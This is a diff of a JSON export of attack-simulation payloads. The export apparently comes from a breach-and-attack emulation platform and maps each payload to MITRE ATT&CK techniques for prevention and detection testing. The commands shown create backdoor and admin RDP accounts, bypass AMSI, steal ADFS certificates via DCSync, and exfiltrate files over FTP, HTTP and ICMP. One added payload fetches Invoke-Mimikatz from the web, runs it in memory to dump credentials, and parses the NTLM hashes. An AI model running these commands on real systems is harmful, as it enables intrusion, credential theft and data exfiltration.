@@ -37,7 +37,13 @@
       "payload_created_at": "2025-06-20T09:48:04.165921Z",
       "payload_updated_at": "2025-07-28T04:00:51.234396Z",
       "command_executor": "bash",
-      "command_content": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n"
+      "command_content": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -89,7 +95,13 @@
       "payload_created_at": "2025-06-20T09:47:56.836293Z",
       "payload_updated_at": "2025-07-30T05:30:52.819944Z",
       "command_executor": "sh",
-      "command_content": "sudo sysadminctl -guestAccount on"
+      "command_content": "sudo sysadminctl -guestAccount on",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -148,7 +160,13 @@
       "payload_updated_at": "2025-06-29T12:34:33.717173Z",
       "payload_output_parsers": [],
       "command_executor": "cmd",
-      "command_content": "net user #{guest_user} /active:yes\n"
+      "command_content": "net user #{guest_user} /active:yes\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -199,7 +217,13 @@
       "payload_created_at": "2025-06-20T09:48:40.124609Z",
       "payload_updated_at": "2025-07-30T05:40:44.512254Z",
       "command_executor": "psh",
-      "command_content": "$url = 'https://github.com/OpenAEV-Platform/payloads/raw/refs/heads/main/attack/01-enterprise/02-initial-access/windows/Download%20Macro-Enabled%20Phishing%20Attachment/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n"
+      "command_content": "$url = 'https://github.com/OpenAEV-Platform/payloads/raw/refs/heads/main/attack/01-enterprise/02-initial-access/windows/Download%20Macro-Enabled%20Phishing%20Attachment/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -287,7 +311,13 @@
       "payload_created_at": "2025-06-20T09:47:56.777864Z",
       "payload_updated_at": "2025-07-30T05:35:12.687745Z",
       "command_executor": "cmd",
-      "command_content": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"
+      "command_content": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -339,7 +369,17 @@
       "payload_created_at": "2025-08-24T10:16:02.282219Z",
       "payload_updated_at": "2025-08-24T10:16:45.159812Z",
       "command_executor": "psh",
-      "command_content": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n"
+      "command_content": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        },
+        {
+          "domain_name": "Network",
+          "domain_color": "#009933"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -391,7 +431,13 @@
       "payload_created_at": "2025-08-24T10:25:43.107737Z",
       "payload_updated_at": "2025-08-24T10:26:12.809465Z",
       "command_executor": "cmd",
-      "command_content": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n"
+      "command_content": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -443,7 +489,13 @@
       "payload_created_at": "2025-06-20T09:47:59.903909Z",
       "payload_updated_at": "2025-06-20T10:16:44.955346Z",
       "command_executor": "psh",
-      "command_content": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
+      "command_content": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -495,7 +547,13 @@
       "payload_created_at": "2025-06-20T09:48:00.763227Z",
       "payload_updated_at": "2025-06-20T10:16:46.103701Z",
       "command_executor": "psh",
-      "command_content": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n"
+      "command_content": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -546,7 +604,13 @@
       "payload_updated_at": "2025-06-28T07:39:47.309677Z",
       "payload_output_parsers": [],
       "command_executor": "cmd",
-      "command_content": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f"
+      "command_content": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -597,7 +661,13 @@
       "payload_created_at": "2025-06-20T09:47:59.922514Z",
       "payload_updated_at": "2025-06-20T10:16:44.976838Z",
       "command_executor": "psh",
-      "command_content": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n"
+      "command_content": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -656,7 +726,13 @@
       "payload_created_at": "2025-06-20T09:48:29.712385Z",
       "payload_updated_at": "2025-06-20T10:17:12.645679Z",
       "command_executor": "psh",
-      "command_content": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+      "command_content": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -744,7 +820,13 @@
       "payload_created_at": "2025-06-20T09:48:29.729751Z",
       "payload_updated_at": "2025-06-20T10:17:12.666754Z",
       "command_executor": "psh",
-      "command_content": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+      "command_content": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -757,6 +839,100 @@
       }
     ],
     "payload_arguments_documents": []
+  },
+  {
+    "export_version": 1,
+    "payload_information": {
+      "payload_type": "Command",
+      "payload_name": "In-Memory Mimikatz- DumpCreds",
+      "payload_description": "In-Memory Mimikatz",
+      "payload_platforms": [
+        "Windows"
+      ],
+      "payload_attack_patterns": [
+        {
+          "attack_pattern_id": "9fabc664-7f82-4f22-9411-f64569aeb1e0",
+          "attack_pattern_name": "LSASS Memory",
+          "attack_pattern_description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
+          "attack_pattern_external_id": "T1003.001",
+          "attack_pattern_kill_chain_phases": null
+        }
+      ],
+      "payload_cleanup_executor": null,
+      "payload_cleanup_command": null,
+      "payload_elevation_required": false,
+      "payload_arguments": [],
+      "payload_prerequisites": [],
+      "payload_external_id": "56a1b6bb-f403-41be-993c-bdda2467978b",
+      "payload_source": "FILIGRAN",
+      "payload_expectations": [
+        "PREVENTION",
+        "DETECTION"
+      ],
+      "payload_status": "VERIFIED",
+      "payload_execution_arch": "ALL_ARCHITECTURES",
+      "payload_detection_remediations": [],
+      "payload_tags": [],
+      "payload_output_parsers": [
+        {
+          "output_parser_id": "6e4b23ad-f709-4bc6-8088-e6e87c39f33c",
+          "output_parser_mode": "STDOUT",
+          "output_parser_type": "REGEX",
+          "output_parser_contract_output_elements": [
+            {
+              "contract_output_element_id": "b878d7c7-9647-44c8-8724-c00d11994778",
+              "contract_output_element_is_finding": true,
+              "contract_output_element_rule": "(?:\\\\t|\\s)*\\*?\\s*Username\\s*:\\s*([^\\s\\\\r\\\\n]+)[\\s\\S]*?NTLM\\s*:\\s*([A-Fa-f0-9]{32})",
+              "contract_output_element_name": "Mimikatz_Memory_NTLM",
+              "contract_output_element_regex_groups": [
+                {
+                  "regex_group_id": "0b8513f7-de4e-43e5-923f-e05ded1e0ca6",
+                  "regex_group_field": "password",
+                  "regex_group_index_values": "$2",
+                  "regex_group_created_at": "2025-09-11T15:22:19.200517Z",
+                  "regex_group_updated_at": "2025-09-11T15:22:19.200517Z"
+                },
+                {
+                  "regex_group_id": "7481286e-2eb5-41ed-8021-8320ac95cf09",
+                  "regex_group_field": "username",
+                  "regex_group_index_values": "$1",
+                  "regex_group_created_at": "2025-09-11T15:22:19.200517Z",
+                  "regex_group_updated_at": "2025-09-11T15:22:19.200517Z"
+                }
+              ],
+              "contract_output_element_key": "Mimikatz_Memory_NTLM",
+              "contract_output_element_type": "credentials",
+              "contract_output_element_tags": [],
+              "contract_output_element_created_at": "2025-09-11T15:22:19Z",
+              "contract_output_element_updated_at": "2025-09-11T15:22:19Z"
+            }
+          ],
+          "output_parser_created_at": "2025-09-11T15:22:19.200026Z",
+          "output_parser_updated_at": "2025-09-11T15:22:19.200026Z"
+        }
+      ],
+      "payload_created_at": "2025-09-11T14:32:38.885665Z",
+      "payload_updated_at": "2025-09-11T15:22:19.199803Z",
+      "command_executor": "psh",
+      "command_content": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
+    },
+    "payload_arguments_documents": [],
+    "payload_tags": [],
+    "payload_attack_patterns": [
+      {
+        "attack_pattern_id": "9fabc664-7f82-4f22-9411-f64569aeb1e0",
+        "attack_pattern_name": "LSASS Memory",
+        "attack_pattern_description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
+        "attack_pattern_external_id": "T1003.001",
+        "attack_pattern_kill_chain_phases": null
+      }
+    ]
   },
   {
     "export_version": 1,
@@ -864,7 +1040,13 @@
       "payload_created_at": "2025-06-20T09:48:36.121608Z",
       "payload_updated_at": "2025-07-30T05:56:56.205302Z",
       "command_executor": "sh",
-      "command_content": "ps aux --no-headers"
+      "command_content": "ps aux --no-headers",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -958,7 +1140,21 @@
       "payload_created_at": "2025-06-20T09:48:40.999361Z",
       "payload_updated_at": "2025-07-30T05:23:04.333440Z",
       "command_executor": "psh",
-      "command_content": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate"
+      "command_content": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        },
+        {
+          "domain_name": "Data Exfiltration",
+          "domain_color": "#9933CC"
+        },
+        {
+          "domain_name": "Network",
+          "domain_color": "#009933"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -1025,7 +1221,21 @@
       "payload_created_at": "2025-06-20T09:48:40.940405Z",
       "payload_updated_at": "2025-07-30T05:22:54.048862Z",
       "command_executor": "psh",
-      "command_content": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n"
+      "command_content": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        },
+        {
+          "domain_name": "Data Exfiltration",
+          "domain_color": "#9933CC"
+        },
+        {
+          "domain_name": "Network",
+          "domain_color": "#009933"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -1092,7 +1302,21 @@
       "payload_created_at": "2025-06-20T09:48:40.920388Z",
       "payload_updated_at": "2025-07-30T05:22:43.528118Z",
       "command_executor": "psh",
-      "command_content": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n"
+      "command_content": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        },
+        {
+          "domain_name": "Data Exfiltration",
+          "domain_color": "#9933CC"
+        },
+        {
+          "domain_name": "Network",
+          "domain_color": "#009933"
+        }
+      ]
     },
     "payload_tags": [],
     "payload_attack_patterns": [
@@ -1141,7 +1365,13 @@
       "payload_created_at": "2025-06-29T13:09:02.196324Z",
       "payload_updated_at": "2025-06-29T13:09:25.362561Z",
       "payload_output_parsers": [],
-      "file_drop_file": "cd524ce4-aa0f-4252-bfa6-b929e7d6a5d3"
+      "file_drop_file": "cd524ce4-aa0f-4252-bfa6-b929e7d6a5d3",
+      "payload_domains": [
+        {
+          "domain_name": "Endpoint",
+          "domain_color": "#389CFF"
+        }
+      ]
     },
     "payload_tags": [
       {
